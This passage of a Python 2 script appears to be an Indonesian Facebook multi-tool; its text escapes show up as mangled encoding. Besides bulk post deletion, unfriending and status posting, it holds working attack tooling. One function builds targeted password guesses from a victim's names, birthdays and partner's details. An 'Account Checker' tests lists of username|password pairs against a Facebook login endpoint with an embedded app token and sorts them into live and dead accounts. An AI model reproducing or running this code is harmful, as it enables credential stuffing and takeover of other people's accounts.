    jalan('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mStarting remove status+AFw-x1b[1;97m ...')
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' +- toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' +- id +- '?method=delete&access_token=' +- toket)
        ok = json.loads(url.text)
        try:
            error = ok['error']['message']
            print '+AFw-x1b[1;91m[+AFw-x1b[1;97m' +- id[:10].replace('+AFw-n', ' ') +- '...' +- '+AFw-x1b[1;91m] +AFw-x1b[1;95mFailed'
        except TypeError:
            print '+AFw-x1b[1;92m[+AFw-x1b[1;97m' +- id[:10].replace('+AFw-n', ' ') +- '...' +- '+AFw-x1b[1;92m] +AFw-x1b[1;96mRemoved'
            piro +-= 1
        except requests.exceptions.ConnectionError:
            print '+AFw-x1b[1;91m[!] Connection Error'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            menu_bot()

    print '+AFw-n+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mFinish'
    raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
    menu_bot()


def accept():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    limit = raw_input('+AFw-x1b[1;91m[!] +AFw-x1b[1;92mLimit +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' +- limit +- '&access_token=' +- toket)
    friends = json.loads(r.text)
    if '[]' in str(friends['data']):
        print '+AFw-x1b[1;91m[!] No friends request'
        raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
        menu_bot()
    jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    for i in friends['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' +- i['from']['id'] +- '?access_token=' +- toket)
        a = json.loads(gas.text)
        if 'error' in str(a):
            print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mName  +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- i['from']['name']
            print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mID    +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- i['from']['id'] +- '+AFw-x1b[1;91m Failed'
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        else:
            print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mName  +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- i['from']['name']
            print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mID    +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- i['from']['id'] +- '+AFw-x1b[1;92m Berhasil'
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'

    print '+AFw-n+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mFinish'
    raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
    menu_bot()


def unfriend():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        print '+AFw-x1b[1;97mStop +AFw-x1b[1;91mCTRL+-C'
        print
        try:
            pek = requests.get('https://graph.facebook.com/me/friends?access_token=' +- toket)
            cok = json.loads(pek.text)
            for i in cok['data']:
                nama = i['name']
                id = i['id']
                requests.delete('https://graph.facebook.com/me/friends?uid=' +- id +- '&access_token=' +- toket)
                print '+AFw-x1b[1;97m[+AFw-x1b[1;92mRemove+AFw-x1b[1;97m] ' +- nama +- ' => ' +- id

        except IndexError:
            pass
        except KeyboardInterrupt:
            print '+AFw-x1b[1;91m[!] Stopped'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            menu_bot()

    print '+AFw-n+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mFinish'
    raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
    menu_bot()


def lain():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    print '+JVE--> +AFw-x1b[1;37;40m1. Write Status'
    print '+JVE--> +AFw-x1b[1;37;40m2. Make Wordlist'
    print '+JVE--> +AFw-x1b[1;37;40m3. Account Checker'
    print '+JVE--> +AFw-x1b[1;37;40m4. List Group'
    print '+JVE--> +AFw-x1b[1;37;40m5. Profile Guard'
    print '+JVE--> +AFw-x1b[1;31;40m0. Back'
    print '+AFw-x1b[1;37;40m+JVE'
    pilih_lain()


def pilih_lain():
    other = raw_input('+JVolUABc-x1b[1;91m+JbYAXA-x1b[1;97m ')
    if other == '':
        print '+AFw-x1b[1;91m[!] Can+AFw't empty'
        pilih_lain()
    else:
        if other == '1':
            status()
        else:
            if other == '2':
                wordlist()
            else:
                if other == '3':
                    check_akun()
                else:
                    if other == '4':
                        grupsaya()
                    else:
                        if other == '5':
                            guard()
                        else:
                            if other == '0':
                                menu()
                            else:
                                print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] +AFw-x1b[1;97m' +- other +- ' +AFw-x1b[1;91mnot found'
                                pilih_lain()


def status():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    msg = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mWrite status +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
    if msg == '':
        print '+AFw-x1b[1;91m[!] Can+AFw't empty'
        raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
        lain()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' +- msg +- '&access_token=' +- toket)
        op = json.loads(res.text)
        jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mStatus ID+AFw-x1b[1;91m : +AFw-x1b[1;97m' +- op['id']
        raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
        lain()


def wordlist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            print '+AFw-x1b[1;91m[?] +AFw-x1b[1;92mIsi data lengkap target dibawah'
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            a = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mName Depan +AFw-x1b[1;97m: ')
            file = open(a +- '.txt', 'w')
            b = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mName Tengah +AFw-x1b[1;97m: ')
            c = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mName Belakang +AFw-x1b[1;97m: ')
            d = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mName Panggilan +AFw-x1b[1;97m: ')
            e = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mTanggal Lahir >+AFw-x1b[1;96mex: |DDMMYY| +AFw-x1b[1;97m: ')
            f = e[0:2]
            g = e[2:4]
            h = e[4:]
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            print '+AFw-x1b[1;91m[?] +AFw-x1b[1;93mKalo Jomblo SKIP aja :v'
            i = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mName Pacar +AFw-x1b[1;97m: ')
            j = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mName Panggilan Pacar +AFw-x1b[1;97m: ')
            k = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mTanggal Lahir Pacar >+AFw-x1b[1;96mex: |DDMMYY| +AFw-x1b[1;97m: ')
            jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
            l = k[0:2]
            m = k[2:4]
            n = k[4:]
            file.write('%s%s+AFw-n%s%s%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s%s+AFw-n%s%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s%s+AFw-n%s%s%s+AFw-n%s%s%s+AFw-n%s%s%s+AFw-n%s%s%s+AFw-n%s%s%s+AFw-n%s%s%s+AFw-n%s%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s+AFw-n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k))
            wg = 0
            while wg < 100:
                wg = wg +- 1
                file.write(a +- str(wg) +- '+AFw-n')

            en = 0
            while en < 100:
                en = en +- 1
                file.write(i +- str(en) +- '+AFw-n')

            word = 0
            while word < 100:
                word = word +- 1
                file.write(d +- str(word) +- '+AFw-n')

            gen = 0
            while gen < 100:
                gen = gen +- 1
                file.write(j +- str(gen) +- '+AFw-n')

            file.close()
            time.sleep(1.5)
            print '+AFw-n+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mSaved +AFw-x1b[1;91m: +AFw-x1b[1;97m %s.txt' % a
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            lain()
        except IOError as e:
            print '+AFw-x1b[1;91m[!] Make file failed'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            lain()


def check_akun():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        print '+AFw-x1b[1;91m[?] +AFw-x1b[1;92mIsi File+AFw-x1b[1;91m : +AFw-x1b[1;97musername|password'
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        live = []
        cek = []
        die = []
        try:
            file = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mFile +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
            list = open(file, 'r').readlines()
        except IOError:
            print '+AFw-x1b[1;91m[!] File not found'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            lain()

    pemisah = raw_input('+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mSeparator +AFw-x1b[1;91m:+AFw-x1b[1;97m ')
    jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    for meki in list:
        username, password = meki.strip().split(str(pemisah))
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' +- username +- '&locale=en_US&password=' +- password +- '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = requests.get(url)
        mpsh = json.loads(data.text)
        if 'access_token' in mpsh:
            live.append(password)
            print '+AFw-x1b[1;97m[+AFw-x1b[1;92mLive+AFw-x1b[1;97m]  +AFw-x1b[1;97m' +- username +- ' | ' +- password
        elif 'www.facebook.com' in mpsh['error_msg']:
            cek.append(password)
            print '+AFw-x1b[1;97m[+AFw-x1b[1;93mCheck+AFw-x1b[1;97m] +AFw-x1b[1;97m' +- username +- ' | ' +- password
        else:
            die.append(password)
            print '+AFw-x1b[1;97m[+AFw-x1b[1;91mDie+AFw-x1b[1;97m]  +AFw-x1b[1;97m' +- username +- ' | ' +- password

    print '+AFw-n+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mTotal+AFw-x1b[1;91m : +AFw-x1b[1;97mLive=+AFw-x1b[1;92m' +- str(len(live)) +- ' +AFw-x1b[1;97mCheck=+AFw-x1b[1;93m' +- str(len(cek)) +- ' +AFw-x1b[1;97mDie=+AFw-x1b[1;91m' +- str(len(die))
    raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
    lain()


def grupsaya():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        jalan('+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-xba] +AFw-x1b[1;92mPlease wait +AFw-x1b[1;97m...')
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' +- toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('grupid.txt', 'w')
                listgrup.append(id)
                f.write(id +- '+AFw-n')
                print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mName  +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- str(nama)
                print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;92mID    +AFw-x1b[1;91m:+AFw-x1b[1;97m ' +- str(id)
                print 52 * '+AFw-x1b[1;97m='

            print '+AFw-n+AFw-r+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mTotal Group +AFw-x1b[1;96m%s' % len(listgrup)
            print '+AFw-x1b[1;91m[+-] +AFw-x1b[1;97mSaved +AFw-x1b[1;91m: +AFw-x1b[1;97mgrupid.txt'
            f.close()
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            lain()
        except (KeyboardInterrupt, EOFError):
            print '+AFw-x1b[1;91m[!] Stopped'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            lain()
        except KeyError:
            os.remove('grupid.txt')
            print '+AFw-x1b[1;91m[!] Group not found'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            lain()
        except requests.exceptions.ConnectionError:
            print '+AFw-x1b[1;91m[+AFw-xe2+AFw-x9c+AFw-x96] No connection'
            keluar()
        except IOError:
            print '+AFw-x1b[1;91m[!] Error when creating file'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            lain()


def guard():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '+AFw-x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
    print '+JVE--> +AFw-x1b[1;37;40m1. Enable'
    print '+JVE--> +AFw-x1b[1;37;40m2. Disable'
    print '+JVE--> +AFw-x1b[1;31;40m0. Back'
    print '+AFw-x1b[1;37;40m+JVE'
    g = raw_input('+JVolUABc-x1b[1;91m+JbYAXA-x1b[1;97m ')
    if g == '1':
        aktif = 'true'
        gaz(toket, aktif)
    else:
        if g == '2':
            non = 'false'
            gaz(toket, non)
        else:
            if g == '0':
                lain()
            else:
                if g == '':
                    keluar()
                else:
                    keluar()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        print logo
        print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
        print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;92mActivated'
        raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
        lain()
    else:
        if '"is_shielded":false' in res.text:
            os.system('clear')
            print logo
            print 52 * '+AFw-x1b[1;97m+AFw-xe2+AFw-x95+AFw-x90'
            print '+AFw-x1b[1;91m[+AFw-x1b[1;96m+AFw-xe2+AFw-x9c+AFw-x93+AFw-x1b[1;91m] +AFw-x1b[1;91mDeactivated'
            raw_input('+AFw-n+AFw-x1b[1;91m[ +AFw-x1b[1;97mBack +AFw-x1b[1;91m]')
            lain()
        else:
            print '+AFw-x1b[1;91m[!] Error'
            keluar()


if __name__ == '__main__':
	login()